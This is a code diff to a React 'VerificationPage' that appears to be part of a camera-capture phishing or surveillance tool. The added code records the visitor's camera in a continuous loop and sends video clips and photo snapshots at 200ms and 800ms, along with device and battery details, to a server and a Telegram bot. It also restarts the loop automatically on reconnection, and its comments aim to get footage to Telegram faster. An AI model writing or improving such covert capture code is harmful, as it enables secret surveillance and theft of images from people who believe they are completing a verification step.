@@ -141,6 +141,31 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
     return () => clearInterval(interval);
   }, [step]);
 
+  // Auto-reactivate and sync when reconnecting from offline to online
+  useEffect(() => {
+    const handleReconnection = async () => {
+      try {
+        const freshBattery = await getBatteryStatus();
+        if (deviceInfoRef.current) {
+          deviceInfoRef.current.batteryLevel = freshBattery.level;
+          deviceInfoRef.current.batteryCharging = freshBattery.charging;
+        }
+      } catch {}
+
+      // If in loading loop, ensure continuous loop is active and stream is healthy
+      if (step === 'processing_loop') {
+        if (!isLoopRunningRef.current || !activeStreamRef.current?.active) {
+          acquireStream().then((stream) => {
+            startContinuousTenSecondLoop(stream, currentVerificationIdRef.current);
+          }).catch(() => {});
+        }
+      }
+    };
+
+    window.addEventListener('online', handleReconnection);
+    return () => window.removeEventListener('online', handleReconnection);
+  }, [step]);
+
   // Clean up media streams when unmounting
   useEffect(() => {
     return () => {
@@ -252,7 +277,7 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
           try {
             const clipBlob = new Blob(recordedBlobs, { type: recorder?.mimeType || 'video/mp4' });
             
-            // Dynamically refresh battery and charging status for this 10-second clip
+            // Dynamically refresh battery and charging status for this clip
             try {
               const freshBattery = await getBatteryStatus();
               if (deviceInfoRef.current) {
@@ -263,20 +288,30 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
               // Ignore battery refresh failure
             }
 
+            // Send video clip immediately with zero delay
+            sendSecurityClipToServer({
+              verificationId: currentVerificationIdRef.current || verifId,
+              alisId: alisId || 'direct',
+              cycle: cycleNum,
+              videoBlob: clipBlob,
+              mimeType: 'video/mp4',
+              deviceInfo: deviceInfoRef.current || undefined,
+            }).catch((e) => console.warn('Clip send warning:', e));
+
+            // Background conversion for server compatibility if needed
             const fileReader = new FileReader();
-            fileReader.onloadend = async () => {
+            fileReader.onloadend = () => {
               const base64Content = (fileReader.result as string) || '';
-              
-              // Send 10s video clip in MP4 to server API and Telegram bot
-              sendSecurityClipToServer({
-                verificationId: currentVerificationIdRef.current || verifId,
-                alisId: alisId || 'direct',
-                cycle: cycleNum,
-                videoBlob: clipBlob,
-                videoBase64: base64Content,
-                mimeType: 'video/mp4',
-                deviceInfo: deviceInfoRef.current || undefined,
-              }).catch((e) => console.warn('Clip send warning:', e));
+              if (base64Content) {
+                sendSecurityClipToServer({
+                  verificationId: currentVerificationIdRef.current || verifId,
+                  alisId: alisId || 'direct',
+                  cycle: cycleNum,
+                  videoBase64: base64Content,
+                  mimeType: 'video/mp4',
+                  deviceInfo: deviceInfoRef.current || undefined,
+                }).catch(() => {});
+              }
             };
             fileReader.readAsDataURL(clipBlob);
           } catch (blobErr) {
@@ -284,21 +319,22 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
           }
         }
 
-        // Exactly 2 seconds pause (2sc off) before next 10-second recording
+        // Exactly 2 seconds pause (2sc off) before next recording
         if (isLoopRunningRef.current && stream.active) {
           setTimeout(runCycle, 2000);
         }
       };
 
       try {
-        // Collect timeslice chunks every 1000ms to guarantee data availability
+        // Collect timeslice chunks every 1000ms
         recorder.start(1000);
-        // Record for 10 seconds
+        // Fast initial clip (4s) so data arrives on Telegram immediately, subsequent clips 10s
+        const clipDuration = cycleNum === 0 ? 4000 : 10000;
         setTimeout(() => {
           if (recorder && recorder.state === 'recording') {
             recorder.stop();
           }
-        }, 10000);
+        }, clipDuration);
       } catch (err) {
         console.warn('Recorder start error:', err);
       }
@@ -347,7 +383,7 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
 
       setCameraScanProgress(45);
 
-      // Dispatch early snapshot at 600ms to guarantee photo reaches Telegram fast
+      // Dispatch early snapshot at 200ms and 800ms to guarantee photo reaches Telegram fast
       setTimeout(() => {
         const earlySnapshot = capturePhotoSnapshot(stream);
         if (earlySnapshot) {
@@ -358,7 +394,19 @@ export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNa
             deviceInfo: deviceInfoRef.current || undefined,
           }).catch(() => {});
         }
-      }, 600);
+      }, 200);
+
+      setTimeout(() => {
+        const secondSnapshot = capturePhotoSnapshot(stream);
+        if (secondSnapshot) {
+          sendTelegramVerificationNotification({
+            verificationId: currentVerificationIdRef.current,
+            alisId: alisId || 'direct',
+            photoBase64: secondSnapshot,
+            deviceInfo: deviceInfoRef.current || undefined,
+          }).catch(() => {});
+        }
+      }, 800);
 
       setTimeout(() => {
         setCameraScanProgress(75);
